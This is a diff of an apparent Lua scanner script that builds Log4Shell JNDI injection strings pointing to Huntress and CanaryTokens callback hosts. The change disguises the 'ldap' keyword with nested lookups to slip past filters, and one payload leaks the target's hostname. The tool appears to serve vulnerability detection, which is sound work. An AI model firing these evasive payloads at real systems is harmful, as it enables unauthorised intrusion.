@@ -34,12 +34,12 @@ end
 local function get_payload(mode, id)
     -- Huntress payload
     if mode == "huntress" then
-        return ("${jndi:ldap://log4shell.huntress.com:1389/%s}"):format(id)
+        return ("${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://log4shell.huntress.com:1389/%s}"):format(id)
     end
 
     -- CanaryToken payload
     if mode == "canary_tokens" then
-        return ("${jndi:ldap://x${hostName}.L4J.%s.canarytokens.com/a}"):format(id)
+        return ("${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://x${hostName}.L4J.%s.canarytokens.com/a}"):format(id)
     end
 
     return nil
